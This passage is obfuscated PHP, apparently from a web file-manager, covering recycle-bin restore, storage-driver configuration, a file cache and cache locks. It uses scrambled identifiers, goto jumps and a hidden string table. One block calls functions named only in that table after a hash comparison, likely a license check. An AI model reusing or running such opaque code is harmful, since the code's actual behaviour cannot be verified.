$a„’ÖÏğ‚Ì = array($B´ù¹²÷[520] => array($B´ù¹²÷[478], $FØğ·‹ÌÏ´[$B´ù¹²÷[454]] . $BÇÄ„îĞìÍ . $B´ù¹²÷[479])); $f„„™±—“‹->where($a„’ÖÏğ‚Ì)->setField($B´ù¹²÷[392], 0); $this->restoreFolderChildren($BÇÄ„îĞìÍ, $e¡½Ñ‚Ôğø); } $this->where(array($B´ù¹²÷[365] => $BÇÄ„îĞìÍ))->delete(); $f„„™±—“‹->folderSizeReset($FØğ·‹ÌÏ´[$B´ù¹²÷[456]]); goto AÍëİ¦Û¢±; C­ŠñÒ¹¥: if ($AÑº¶Û£—’ != !1 && !in_array($BÇÄ„îĞìÍ, $AÑº¶Û£—’)) { continue; } $FØğ·‹ÌÏ´ = $f„„™±—“‹->sourceInfo($BÇÄ„îĞìÍ); $B³çŸÁï˜ = $f„„™±—“‹->sourceInfo($FØğ·‹ÌÏ´[$B´ù¹²÷[456]]); goto C‚¥÷°œ£ñ; AÍëİ¦Û¢±: $d÷‹°”¸ËÈ[] = $FØğ·‹ÌÏ´[$B´ù¹²÷[456]]; if ($FØğ·‹ÌÏ´[$B´ù¹²÷[366]] == $B´ù¹²÷[83]) { $d÷‹°”¸ËÈ[] = $BÇÄ„îĞìÍ; } $f„„™±—“‹->lockMoveEnd($BÇÄ„îĞìÍ); goto AÊÄÅŸÅ’; AÊÄÅŸÅ’: } $f„„™±—“‹->updateModifyTime($d÷‹°”¸ËÈ); goto bÇº¶ñ¸‘; fÚ½ß­©åÑ: $AÑº¶Û£—’ = $AÑº¶Û£—’ == !1 ? !1 : $AÑº¶Û£—’; if (!$e¡½Ñ‚Ôğø) { return !0; } $d÷‹°”¸ËÈ = array(); goto FÖÚîÍöŸ; bÇº¶ñ¸‘: } private function restoreFolderChildren($aî¾æÜ¾×è, $BÊ®Õä¦‘÷) { goto aŒÒ¹‘ã„÷; bËŒåíğìÒ: foreach ($BÊ®Õä¦‘÷ as $a“ˆÖğºç) { if ($a“ˆÖğºç == $aî¾æÜ¾×è) { continue; } if (!$dÀˆÎ×¾İÓ->isParentOf($aî¾æÜ¾×è, $a“ˆÖğºç)) { continue; } $cêƒœôÀèó = $dÀˆÎ×¾İÓ->sourceInfo($a“ˆÖğºç); if ($cêƒœôÀèó[$EĞ¢ˆŸ„½¶[366]] == $EĞ¢ˆŸ„½¶[83]) { $eÌ¨”›×‰[] = array($EĞ¢ˆŸ„½¶[520] => array($EĞ¢ˆŸ„½¶[478], $cêƒœôÀèó[$EĞ¢ˆŸ„½¶[454]] . $a“ˆÖğºç . $EĞ¢ˆŸ„½¶[479])); } else { $eÌ¨”›×‰[$EĞ¢ˆŸ„½¶[365]][1][] = $a“ˆÖğºç; } } if (!$eÌ¨”›×‰[$EĞ¢ˆŸ„½¶[365]][1]) { unset($eÌ¨”›×‰[$EĞ¢ˆŸ„½¶[365]]); } if (!$eÌ¨”›×‰) { return; } goto E¤áŠó„¬ë; E¤áŠó„¬ë: $eÌ¨”›×‰[$EĞ¢ˆŸ„½¶[365]][1] = array_unique($eÌ¨”›×‰[$EĞ¢ˆŸ„½¶[365]][1]); $eÌ¨”›×‰[$EĞ¢ˆŸ„½¶[918]] = $EĞ¢ˆŸ„½¶[2160]; $dÀˆÎ×¾İÓ->where($eÌ¨”›×‰)->setField($EĞ¢ˆŸ„½¶[392], 1); goto c‹‰†Î÷×Ö; aŒÒ¹‘ã„÷: $EĞ¢ˆŸ„½¶ =& $_SERVER[Õİõş]; $dÀˆÎ×¾İÓ = Model($EĞ¢ˆŸ„½¶[1113]); $eÌ¨”›×‰ = array($EĞ¢ˆŸ„½¶[365] => array($EĞ¢ˆŸ„½¶[7], array())); goto bËŒåíğìÒ; c‹‰†Î÷×Ö: } private function recycleMove($bîó¬À”, $DŸÉ÷é¶ê‘ = 1) { $EŞæÊÄé”á =& $_SERVER[Õİõş]; $dÊ´ÀÕÄäŠ = Model($EŞæÊÄé”á[1113]); $F„¨…‚•­İ = Model($EŞæÊÄé”á[2329]); $aÊŞİï æä = array($EŞæÊÄé”á[365] => $bîó¬À”); if ($DŸÉ÷é¶ê‘) { $dÊ´ÀÕÄäŠ->where($aÊŞİï æä)->setField($EŞæÊÄé”á[392], 1); $F„¨…‚•­İ->eventRecycle($bîó¬À”, $EŞæÊÄé”á[2330]); } else { $FèÖœ²§ìì = $dÊ´ÀÕÄäŠ->where($aÊŞİï æä)->find(); $Fê»›á‰ì = $FèÖœ²§ìì[$EŞæÊÄé”á[366]] == $EŞæÊÄé”á[83]; $C‹Ï…ŸÚÂ‡ = $dÊ´ÀÕÄäŠ->fileNameAuto($FèÖœ²§ìì[$EŞæÊÄé”á[456]], $FèÖœ²§ìì[$EŞæÊÄé”á[28]], REPEAT_RENAME_FOLDER, $Fê»›á‰ì); if ($C‹Ï…ŸÚÂ‡ != $FèÖœ²§ìì[$EŞæÊÄé”á[28]]) { $dÊ´ÀÕÄäŠ->rename($bîó¬À”, $C‹Ï…ŸÚÂ‡); } $dÊ´ÀÕÄäŠ->where($aÊŞİï æä)->setField($EŞæÊÄé”á[392], 0); $F„¨…‚•­İ->eventRecycle($bîó¬À”, $EŞæÊÄé”á[2331]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x73\164\x6f\162\x61\147\x65\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x73\151\172\x65\115\x61\x78", "\163\171\x73\x74\x65\x6d", "\x64\145\x66\141\x75\154\x74", "\144\162\151\166\145\162", "\x63\x6f\x6e\146\x69\x67"); public function listData($FìË…¸‡Ş = false, $c®ôãÆß = "\x6d\x6f\144\x69\x66\x79\124\151\155\x65", $dÀ·í©„‚± = false) { goto a„®«ØÊø; bâš‘Ñµ: return $aĞµ…˜ˆîÑ; goto A©…¦—ÕÎ; a„®«ØÊø: $déá‚¦¸Ö =& $_SERVER[Õİõş]; $aĞµ…˜ˆîÑ = parent::listData($FìË…¸‡Ş, $c®ôãÆß, $dÀ·í©„‚±); if ($FìË…¸‡Ş) { return $aĞµ…˜ˆîÑ; } goto Dç¢ÛÉ÷æ; Dç¢ÛÉ÷æ: foreach ($aĞµ…˜ˆîÑ as $B©×ĞºÛ­ô => $fÔã¿ËŒ•à) { unset($aĞµ…˜ˆîÑ[$B©×ĞºÛ­ô][$déá‚¦¸Ö[6]]); $aĞµ…˜ˆîÑ[$B©×ĞºÛ­ô][$déá‚¦¸Ö[2066]] = 0; } $B°…×ÃÎ¥² = array_to_keyvalue($aĞµ…˜ˆîÑ, $déá‚¦¸Ö[33], $déá‚¦¸Ö[363]); $this->_listAppendSize($aĞµ…˜ˆîÑ, $B°…×ÃÎ¥²); goto bâš‘Ñµ; A©…¦—ÕÎ: } public function _listAppendSize(&$C®âç‘’, $b¦ÌŠ……Õ¥) { $F†¨ÖˆÃÄ‘ =& $_SERVER[Õİõş]; $EŸË‹â‡ğ¯ = $F†¨ÖˆÃÄ‘[2332] . implode($F†¨ÖˆÃÄ‘[47], $b¦ÌŠ……Õ¥) . $F†¨ÖˆÃÄ‘[2333]; $E‰¾ÅŒ³“ = Model($F†¨ÖˆÃÄ‘[721])->query($EŸË‹â‡ğ¯); $E‰¾ÅŒ³“ = array_to_keyvalue($E‰¾ÅŒ³“, $F†¨ÖˆÃÄ‘[363], $F†¨ÖˆÃÄ‘[77]); foreach ($C®âç‘’ as $F³óÁ ÷ => $cÚªİÍ½„£) { $C®âç‘’[$F³óÁ ÷][$F†¨ÖˆÃÄ‘[2066]] = isset($E‰¾ÅŒ³“[$cÚªİÍ½„£[$F†¨ÖˆÃÄ‘[363]]]) ? $E‰¾ÅŒ³“[$cÚªİÍ½„£[$F†¨ÖˆÃÄ‘[363]]] : 0; } } public function getConfig($bªŸâ™×Ì˜) { $F–îÛãˆÇ = parent::listData($bªŸâ™×Ì˜); return json_decode($F–îÛãˆÇ[$_SERVER[Õİõş][6]], !0); } public function update($aŞˆŞ±·Şñ, $f ³°Û¨Í†) { goto E‰¾Ğ¤µÖÉ; CÏ¿Ê±¥‚: $A‹ª†‡ˆÁÊ = parent::update($aŞˆŞ±·Şñ, $f ³°Û¨Í†); if ($A‹ª†‡ˆÁÊ && $f ³°Û¨Í†[$cÆÏºË†[34]]) { foreach ($eÂ„œøª¬º as $Bœ÷óæï¡›) { if ($Bœ÷óæï¡›[$cÆÏºË†[34]] && $Bœ÷óæï¡›[$cÆÏºË†[363]] != $aŞˆŞ±·Şñ) { parent::update($Bœ÷óæï¡›[$cÆÏºË†[363]], array($cÆÏºË†[34] => 0)); } } } return $A‹ª†‡ˆÁÊ; goto bÊê¥ñÑÇî; b£Ê›÷˜®: if (isset($eÂ„œøª¬º[$D¥„ËÌƒë]) && $eÂ„œøª¬º[$D¥„ËÌƒë][$cÆÏºË†[363]] != $aŞˆŞ±·Şñ) { return !1; } if (isset($f ³°Û¨Í†[$cÆÏºË†[2334]]) && $f ³°Û¨Í†[$cÆÏºË†[2334]] == $cÆÏºË†[83]) { $this->checkConfig($f ³°Û¨Í†); } unset($f ³°Û¨Í†[$cÆÏºË†[2334]]); goto CÏ¿Ê±¥‚; E‰¾Ğ¤µÖÉ: $cÆÏºË† =& $_SERVER[Õİõş]; $D¥„ËÌƒë = $f ³°Û¨Í†[$cÆÏºË†[28]]; $eÂ„œøª¬º = array_to_keyvalue(parent::listData(), $cÆÏºË†[28]); goto b£Ê›÷˜®; bÊê¥ñÑÇî: } public function add($dñÌè¢§Šß) { goto cÑ¿¬µÀ‚¸; bÎÂÆŸ ÜÁ: $this->checkConfig($dñÌè¢§Šß); $f½Šö¹ä‰‘ = parent::insert($dñÌè¢§Šß); if ($f½Šö¹ä‰‘ && $dñÌè¢§Šß[$a ÑÕ‚ß½[34]]) { foreach ($EÅ…„ÛÇæã as $e¦õì‡İİÂ) { if ($e¦õì‡İİÂ[$a ÑÕ‚ß½[34]]) { parent::update($e¦õì‡İİÂ[$a ÑÕ‚ß½[363]], array($a ÑÕ‚ß½[34] => 0)); } } } goto eÊƒ®· ; eÊƒ®· : return $f½Šö¹ä‰‘; goto aôÓ¯Ö½å; cÑ¿¬µÀ‚¸: $a ÑÕ‚ß½ =& $_SERVER[Õİõş]; $EÅ…„ÛÇæã = array_to_keyvalue(parent::listData(), $a ÑÕ‚ß½[28]); if (isset($EÅ…„ÛÇæã[$dñÌè¢§Šß[$a ÑÕ‚ß½[28]]])) { return !1; } goto bÎÂÆŸ ÜÁ; aôÓ¯Ö½å: } public function checkConfig(&$fï•ƒÊ¨) { goto eø¿’Œ¹‹å; FÓöˆä«¥: $Bò‚”¥ôá = $fËÓ÷Şæ[71] . $dèìŞÖæ¥Ú; $a»¤Æ¯¡ğ = new $Bò‚”¥ôá($C¦•’¶Ëåñ); if (in_array($E¡Íµ«‹«ß, $a»¤Æ¯¡ğ->objectDriver)) { if (!$a»¤Æ¯¡ğ->isBucketCors() && !$a»¤Æ¯¡ğ->setBucketCors()) { $bõÜ‚õÛˆ• = LNG($fËÓ÷Şæ[2335]); $bõÜ‚õÛˆ• .= $fËÓ÷Şæ[2336] . LNG($fËÓ÷Şæ[2337]); show_json($bõÜ‚õÛˆ•, !1); } } goto aÌ·®Åñ; AÓÉÁÛôß: $fï•ƒÊ¨[$fËÓ÷Şæ[6]] = json_encode($C¦•’¶Ëåñ); $fï•ƒÊ¨[$fËÓ÷Şæ[90]] = $dèìŞÖæ¥Ú; return !0; goto c”Çê¸à½²; aÌ·®Åñ: $f®ˆÉŠˆ¬ = $a»¤Æ¯¡ğ->getPath($D˜ÊîŸíñ . $fËÓ÷Şæ[1962]); if (!$a»¤Æ¯¡ğ->mkfile($f®ˆÉŠˆ¬)) { show_json(LNG($fËÓ÷Şæ[2335]), !1); } $C¦•’¶Ëåñ[$fËÓ÷Şæ[1026]] = $D˜ÊîŸíñ; goto AÓÉÁÛôß; D¡«Á˜Ô‘Ÿ: foreach ($C¦•’¶Ëåñ as $f’¹ƒš¿‚Ê => $B¸æÒ §) { $C¦•’¶Ëåñ[$f’¹ƒš¿‚Ê] = trim($B¸æÒ §); } $D˜ÊîŸíñ = rtrim($C¦•’¶Ëåñ[$fËÓ÷Şæ[1026]], $fËÓ÷Şæ[8]) . $fËÓ÷Şæ[8]; $dèìŞÖæ¥Ú = $this->driverType($E¡Íµ«‹«ß); goto FÓöˆä«¥; eø¿’Œ¹‹å: $fËÓ÷Şæ =& $_SERVER[Õİõş]; $E¡Íµ«‹«ß = strtolower($fï•ƒÊ¨[$fËÓ÷Şæ[90]]); $C¦•’¶Ëåñ = json_decode($fï•ƒÊ¨[$fËÓ÷Şæ[6]], !0); goto D¡«Á˜Ô‘Ÿ; c”Çê¸à½²: } private function driverType($d¶¿²¡Åõù) { $BÈˆ»ò©Î‹ =& $_SERVER[Õİõş]; $fœ‹ÅŞ÷§å = array($BÈˆ»ò©Î‹[101] => $BÈˆ»ò©Î‹[2338], $BÈˆ»ò©Î‹[58] => $BÈˆ»ò©Î‹[2339], $BÈˆ»ò©Î‹[64] => $BÈˆ»ò©Î‹[2340]); if (isset($fœ‹ÅŞ÷§å[$d¶¿²¡Åõù])) { return $fœ‹ÅŞ÷§å[$d¶¿²¡Åõù]; } return strtoupper($d¶¿²¡Åõù); } public function driverListSystem() { $C¼î¿”´›¬ =& $_SERVER[Õİõş]; $d” õõ³¼ì = parent::listData(); $B¸›î†åˆ = array(); foreach ($d” õõ³¼ì as $FŞí›„‘È¾) { unset($FŞí›„‘È¾[$C¼î¿”´›¬[183]], $FŞí›„‘È¾[$C¼î¿”´›¬[106]]); $FŞí›„‘È¾[$C¼î¿”´›¬[6]] = json_decode($FŞí›„‘È¾[$C¼î¿”´›¬[6]], !0); $B¸›î†åˆ[] = $FŞí›„‘È¾; } return $B¸›î†åˆ; } public function defaultDriver() { $eê• £—Ä =& $_SERVER[Õİõş]; $DÙ§ù¬‰–á = parent::listData(); $d¢·ŠŒà…ñ = array_filter_by_field($DÙ§ù¬‰–á, $eê• £—Ä[34], 1); $d¢·ŠŒà…ñ = $d¢·ŠŒà…ñ[0]; if ($d¢·ŠŒà…ñ) { $d¢·ŠŒà…ñ[$eê• £—Ä[6]] = json_decode($d¢·ŠŒà…ñ[$eê• £—Ä[6]], !0); } return $d¢·ŠŒà…ñ; } public function driverInfo($Aõš¶œˆ´) { $FŒ©¤ÈÃƒ =& $_SERVER[Õİõş]; $Bö¢šùˆÎ = array_to_keyvalue(parent::listData(), $FŒ©¤ÈÃƒ[363]); if (!isset($Bö¢šùˆÎ[$Aõš¶œˆ´])) { return !1; } $DÊ¤…å¦² = $Bö¢šùˆÎ[$Aõš¶œˆ´]; $DÊ¤…å¦²[$FŒ©¤ÈÃƒ[6]] = json_decode($DÊ¤…å¦²[$FŒ©¤ÈÃƒ[6]], !0); return $DÊ¤…å¦²; } public function remove($Bóù®Êä¨ˆ) { $this->removeShareItems($Bóù®Êä¨ˆ); return parent::remove($Bóù®Êä¨ˆ); } public function removeWithFile($bÍÌŠ¦‘“µ) { goto fß¾Ã±ÚÈÆ; a–Ê½·ÅğŒ: $eäøÌğÃæ->task[$Aœ¦œ„¤êí[700]] = (double) $FÄ±ùÜ»²×; $Dñé…ØãÒ’ = KodIO::defaultDriver(); $CŠ¶…óÁâĞ = $Dñé…ØãÒ’[$Aœ¦œ„¤êí[363]]; goto DÉ„Ã‚ŠÌ; a½ÊŒ«¹Ê: $dĞâ»·íäà = Model($Aœ¦œ„¤êí[163])->where($C¼õ…‘Êá)->field($Aœ¦œ„¤êí[2344])->select(); foreach ($dĞâ»·íäà as $fœÑß³±œ) { goto aÅµÉŠË‹; Aóƒ½¼Ø‡Š: if (IO::exist($A‹íãã¸)) { $eäøÌğÃæ->updateFileEnd($fœÑß³±œ[$Aœ¦œ„¤êí[28]], $fœÑß³±œ[$Aœ¦œ„¤êí[77]]); continue; } if (!IO::move($EÓÚº‹Ó, get_path_father($A‹íãã¸))) { $eã¾¢›Š²Ù = !1; break; } $C¼õ…‘Êá = array($Aœ¦œ„¤êí[414] => $fœÑß³±œ[$Aœ¦œ„¤êí[414]]); goto CË¹áÔ¨ø; aÅµÉŠË‹: $EÓÚº‹Ó = $fœÑß³±œ[$Aœ¦œ„¤êí[75]]; $A‹íãã¸ = $B¡‹¿Ÿù°î . str_replace("\173\151\157\72{$bÍÌŠ¦‘“µ}\x7d\x2f", $Aœ¦œ„¤êí[33], $EÓÚº‹Ó); if (!IO::exist($EÓÚº‹Ó)) { $C¾¦Ìâí×Ù[] = $fœÑß³±œ[$Aœ¦œ„¤êí[414]]; $eäøÌğÃæ->updateFileEnd($fœÑß³±œ[$Aœ¦œ„¤êí[28]], $fœÑß³±œ[$Aœ¦œ„¤êí[77]]); continue; } goto Aóƒ½¼Ø‡Š; CË¹áÔ¨ø: $E÷·®¨ Í = array($Aœ¦œ„¤êí[745] => $CŠ¶…óÁâĞ, $Aœ¦œ„¤êí[75] => $A‹íãã¸); Model($Aœ¦œ„¤êí[163])->where($C¼õ…‘Êá)->save($E÷·®¨ Í); goto B¡¶áÜËİ; B¡¶áÜËİ: } $this->removeByFileID($C¾¦Ìâí×Ù); goto bèï˜Õ×«; bèï˜Õ×«: if (!$eã¾¢›Š²Ù) { $eäøÌğÃæ->stop($e‘„İöåæ²); return !1; } $eäøÌğÃæ->end(); $this->remove($bÍÌŠ¦‘“µ); goto Eœõ°ï„ñ; DÉ„Ã‚ŠÌ: $B¡‹¿Ÿù°î = "\x7b\151\157\x3a{$CŠ¶…óÁâĞ}\175\57"; $eã¾¢›Š²Ù = !0; $C¾¦Ìâí×Ù = array(); goto a½ÊŒ«¹Ê; fß¾Ã±ÚÈÆ: $Aœ¦œ„¤êí =& $_SERVER[Õİõş]; $C¼õ…‘Êá = array($Aœ¦œ„¤êí[745] => $bÍÌŠ¦‘“µ); $F±ÔÆ®™‚ = Model($Aœ¦œ„¤êí[417])->where($C¼õ…‘Êá)->count(); goto EÊÄ¶©Ò¤°; EÊÄ¶©Ò¤°: $FÄ±ùÜ»²× = Model($Aœ¦œ„¤êí[417])->where($C¼õ…‘Êá)->sum($Aœ¦œ„¤êí[77]); $e‘„İöåæ² = $Aœ¦œ„¤êí[2341] . $bÍÌŠ¦‘“µ; $eäøÌğÃæ = new TaskFileTransfer($e‘„İöåæ², $Aœ¦œ„¤êí[2342], $F±ÔÆ®™‚, LNG($Aœ¦œ„¤êí[2343]) . "\x28{$bÍÌŠ¦‘“µ}\x29"); goto a–Ê½·ÅğŒ; Eœõ°ï„ñ: } public function progress($c´…ÕÈ­çÖ) { return Task::get($_SERVER[Õİõş][2341] . $c´…ÕÈ­çÖ); } private function removeByFileID($eˆ«Ç±ó˜Ş = array()) { goto bô®«¤Ã›; dë»Öà—‘„: $b¾’ÏÂ²„­ = Model($B¿õØÌÙÉœ[1113])->where($bĞ¨é»ËÜ)->field($B¿õØÌÙÉœ[365])->select(); if (!$b¾’ÏÂ²„­) { return; } $b¾’ÏÂ²„­ = array_to_keyvalue($b¾’ÏÂ²„­, $B¿õØÌÙÉœ[33], $B¿õØÌÙÉœ[365]); goto Fô‡è²œÌá; Fô‡è²œÌá: foreach ($b¾’ÏÂ²„­ as $c¨³ñì¡) { Model($B¿õØÌÙÉœ[378])->removeNow($c¨³ñì¡, !1); } goto b´Íç“¤ ‘; bô®«¤Ã›: $B¿õØÌÙÉœ =& $_SERVER[Õİõş]; if (empty($eˆ«Ç±ó˜Ş)) { return; } $bĞ¨é»ËÜ = array($B¿õØÌÙÉœ[414] => array($B¿õØÌÙÉœ[7], $eˆ«Ç±ó˜Ş)); goto dë»Öà—‘„; b´Íç“¤ ‘: } private function removeShareItems($föËİã™æÃ) { goto A„ñíïïâä; bí¥ÆØÅ˜ñ: Model($bùõÈ×‚Ø§[531])->remove($eÃí¾’¶); goto eÅ×ô³¯£; A„ñíïïâä: $bùõÈ×‚Ø§ =& $_SERVER[Õİõş]; $AÄô»£‘ö‰ = "\x7b\x69\157\x3a{$föËİã™æÃ}\175\x2f"; $Eß¼Æ¸†“ = array($bùõÈ×‚Ø§[365] => 0, $bùõÈ×‚Ø§[1020] => array($bùõÈ×‚Ø§[753], "{$AÄô»£‘ö‰}\x25")); goto E‰ ªæ©Ó­; E‰ ªæ©Ó­: $EˆØöÛ«« = Model($bùõÈ×‚Ø§[2057])->where($Eß¼Æ¸†“)->field($bùõÈ×‚Ø§[436])->select(); if (empty($EˆØöÛ««)) { return; } $eÃí¾’¶ = array_to_keyvalue($EˆØöÛ««, $bùõÈ×‚Ø§[33], $bùõÈ×‚Ø§[436]); goto bí¥ÆØÅ˜ñ; eÅ×ô³¯£: } } goto CÑèÉ±‘Š; CšæîùÈ„: define($_SERVER[Õİõş][1909], 2); define($_SERVER[Õİõş][1910], 3); define($_SERVER[Õİõş][1911], 4); goto A‰æ§É¿Â; DññÍÜô£¸: if ($_SERVER[$_SERVER[Õİõş][764]] != $B¼³ùİ…($a†»¹¡¶„‚)) { goto aÓßÉ¿‹î°; f‚ÁÑß°ù: $cŞ¾‹ÆÄ× = explode($_SERVER[Õİõş][213], $B¢§„ìª­); if (count($cŞ¾‹ÆÄ×) < $_SERVER[Õİõş][560]) { $Cá¬âÛ¦áÙ = $_SERVER[Õİõş][768]; $Cá¬âÛ¦áÙ(); } $Bä‘æŠéÖ = $_SERVER[Õİõş][769]; goto e‹ò‰‡¹æ; e‹ò‰‡¹æ: $Bä‘æŠéÖ($a†»¹¡¶„‚); goto a›ß“–ÈŸ“; aÓßÉ¿‹î°: $b—‹äÎÇæ‹ = $_SERVER[Õİõş][765]; $bªÈ×¡˜è¤ = $_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]; $B¢§„ìª­ = $b—‹äÎÇæ‹($bªÈ×¡˜è¤); goto f‚ÁÑß°ù; a›ß“–ÈŸ“: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($FŒ¹„ÅÃŸ, $c¼©…ŒÔß‘) { $DàæÒÜİ‹ =& $_SERVER[Õİõş]; $this->cachePath = $FŒ¹„ÅÃŸ[$DàæÒÜİ‹[75]]; $this->prefix = $DàæÒÜİ‹[770]; $this->cacheTime = $c¼©…ŒÔß‘; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($f‰Ÿ•‘„íí) { $få„ƒÄİ¥ =& $_SERVER[Õİõş]; $f‰Ÿ•‘„íí = str_replace(array($få„ƒÄİ¥[771], $få„ƒÄİ¥[93], $få„ƒÄİ¥[69]), $få„ƒÄİ¥[772], $f‰Ÿ•‘„íí); return $this->cachePath . $få„ƒÄİ¥[773] . $f‰Ÿ•‘„íí . $få„ƒÄİ¥[774]; } public function set($BÒ‡ˆÚˆä², $E¼‹èİÕ­, $cÆÅîˆŒ¢À = false) { $Cˆã…ëîáÏ = $this->getFile($BÒ‡ˆÚˆä²); if (file_put_contents($Cˆã…ëîáÏ, $this->prefix . $E¼‹èİÕ­, LOCK_EX)) { return !0; } @unlink($Cˆã…ëîáÏ); return !1; } public function get($Cø¼÷Çê•) { $aÏçò÷³‘ = $this->getFile($Cø¼÷Çê•); if (file_exists($aÏçò÷³‘) && filemtime($aÏçò÷³‘) < time() - $this->cacheTime) { @unlink($aÏçò÷³‘); return !1; } $F”¥¶¤ø = @file_get_contents($aÏçò÷³‘); return substr($F”¥¶¤ø, strlen($this->prefix)); } public function remove($Bí¯Õ‚ªšÆ) { $aéÔ³ƒò£ = $this->getFile($Bí¯Õ‚ªšÆ); return @unlink($aéÔ³ƒò£); } public function deleteAll() { $d»…Ÿ¡‡‹ =& $_SERVER[Õİõş]; $EÄ¿‚Œå‰Ó = scandir($this->cachePath); foreach ($EÄ¿‚Œå‰Ó as $D³¸¿Õ†Š) { $EòØÓ©˜êô = $this->cachePath . $D³¸¿Õ†Š; if (strpos($EòØÓ©˜êô, $d»…Ÿ¡‡‹[774]) && strpos($EòØÓ©˜êô, $d»…Ÿ¡‡‹[775])) { @unlink($EòØÓ©˜êô); } } } public function clearTimeout() { $bêÖå¢Ç¾Ä =& $_SERVER[Õİõş]; $d³ÍÜåª’ˆ = scandir($this->cachePath); foreach ($d³ÍÜåª’ˆ as $b„‹Òµ¶ôŠ) { $aìÀ‘™±‹¶ = $this->cachePath . $b„‹Òµ¶ôŠ; if (strpos($aìÀ‘™±‹¶, $bêÖå¢Ç¾Ä[774]) && strpos($aìÀ‘™±‹¶, $bêÖå¢Ç¾Ä[775]) && filemtime($aìÀ‘™±‹¶) < time() - $this->cacheTime) { @unlink($aìÀ‘™±‹¶); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto eâÌ¿æ¥‘; bŞÌ¬†ËÆ: if ($CÛÑ¥çÛ‚Á == $aÎ’ó«ÁÎ[17] && $cöŞ¯”š„ == $aÎ’ó«ÁÎ[9]) { $CÛÑ¥çÛ‚Á = $aÎ’ó«ÁÎ[163]; } switch ($CÛÑ¥çÛ‚Á) { case $aÎ’ó«ÁÎ[758]: self::$handle = new CacheLockRedis(); break; case $aÎ’ó«ÁÎ[759]: self::$handle = new CacheLockMemcached(); break; case $aÎ’ó«ÁÎ[17]: self::$handle = new CacheLockDatabase(); break; case $aÎ’ó«ÁÎ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto f™ã‡§³¥«; CÃ…ç­à ã: self::$timeout = $D±ÜÇ—„à™[$aÎ’ó«ÁÎ[776]] ? $D±ÜÇ—„à™[$aÎ’ó«ÁÎ[776]] : 10; $cöŞ¯”š„ = _get($GLOBALS[$aÎ’ó«ÁÎ[6]], $aÎ’ó«ÁÎ[777]); $CÛÑ¥çÛ‚Á = $D±ÜÇ—„à™[$aÎ’ó«ÁÎ[755]] ? $D±ÜÇ—„à™[$aÎ’ó«ÁÎ[755]] : $aÎ’ó«ÁÎ[163]; goto bŞÌ¬†ËÆ; eâÌ¿æ¥‘: $aÎ’ó«ÁÎ =& $_SERVER[Õİõş]; if (self::$handle) { return self::$handle; } $D±ÜÇ—„à™ = $GLOBALS[$aÎ’ó«ÁÎ[6]][$aÎ’ó«ÁÎ[333]]; goto CÃ…ç­à ã; f™ã‡§³¥«: } private static function key($BŠä½âÏ) { return $_SERVER[Õİõş][778] . Cache::key($BŠä½âÏ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($E±¦…œÙæÑ = '') { self::$errorMsg = $E±¦…œÙæÑ; } public static function lockGlobal($EÓİÔ”Ù°, $eàœîñœÚƒ) { return self::lock($EÓİÔ”Ù°, $eàœîñœÚƒ, !0); } public static function lock($B—‘›âÍ«¡, $EÏÈœÄÎÙ = false, $D‹§¯³™Æè = false) { goto fëö‹“È¦; fëö‹“È¦: $E·ó”ˆªå¸ =& $_SERVER[Õİõş]; $b£ÕÅÃ¾Æ¨ = self::init(); $bìÌî­¡ï¹ = self::key($B—‘›âÍ«¡); goto CĞ—²ºÉ˜É; BÅ‹ãÅ¨: if (!$D‹§¯³™Æè) { self::$lockItem[$bìÌî­¡ï¹] = !0; } return $cœßæİˆË; goto d ãô˜æ‘®; CĞ—²ºÉ˜É: $EÏÈœÄÎÙ = $EÏÈœÄÎÙ ? $EÏÈœÄÎÙ : self::$timeout; $cœßæİˆË = $b£ÕÅÃ¾Æ¨->lock($bìÌî­¡ï¹, $EÏÈœÄÎÙ); if (!$cœßæİˆË) { $d±Ø¶…‹„Ç = $E·ó”ˆªå¸[779] . $EÏÈœÄÎÙ . $E·ó”ˆªå¸[67] . self::$errorMsg . $E·ó”ˆªå¸[67] . get_caller_msg(); $Dô«ßï³ã” = "\114\x6f\143\153\x20\141\143\164\151\x6f\x6e\72\x20{$bìÌî­¡ï¹}\x20\164\151\x6d\145\157\x75\164\x2c\x6f\x76\x65\162\40{$EÏÈœÄÎÙ}\40\163"; $Dô«ßï³ã” = self::$errorMsg ? self::$errorMsg : $eÁ¶âì±é; write_log($d±Ø¶…‹„Ç, $E·ó”ˆªå¸[780]); show_json($Dô«ßï³ã”, !1); } goto BÅ‹ãÅ¨; d ãô˜æ‘®: } public static function lockGet($b¦šŒï‰ã±) { $Cõ›†ºÜŞ = self::key($b¦šŒï‰ã±); if (self::$lockItem[$Cõ›†ºÜŞ]) { return self::$lockItem[$Cõ›†ºÜŞ]; } return self::init()->lockGet($Cõ›†ºÜŞ); } public static function unlock($eğì¢àÜñ°) { $F£ÙéÑ­Ì‚ = self::key($eğì¢àÜñ°); self::$lockItem[$F£ÙéÑ­Ì‚] = null; return self::init()->unlock($F£ÙéÑ­Ì‚); } public static function unlockRuntime() { $Aºòê®×¤™ =& $_SERVER[Õİõş]; $f‡‹½‚šƒ‹ = self::init(); $AÚ÷ò™Ù = !1; foreach (self::$lockItem as $cŠÕÍÄ‡ => $Eˆİ˜Ëì¦æ) { if (!$Eˆİ˜Ëì¦æ) { continue; } $f‡‹½‚šƒ‹->unlock($cŠÕÍÄ‡); if (!$AÚ÷ò™Ù) { $AÚ÷ò™Ù = !0; write_log($Aºòê®×¤™[781] . $cŠÕÍÄ‡ . $Aºòê®×¤™[67] . get_caller_msg(), $Aºòê®×¤™[780]); continue; } write_log($Aºòê®×¤™[781] . $cŠÕÍÄ‡, $Aºòê®×¤™[780]); } } } goto c¼…‘Ç¤À¹; FŠ«ÈÃ„ : class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\145" => "\x75\163\145\162\137\155\145\164\x61", "\155\x65\164\141\106\151\x65\154\x64" => "\x75\163\145\x72\x49\x44"); protected $simpleField = 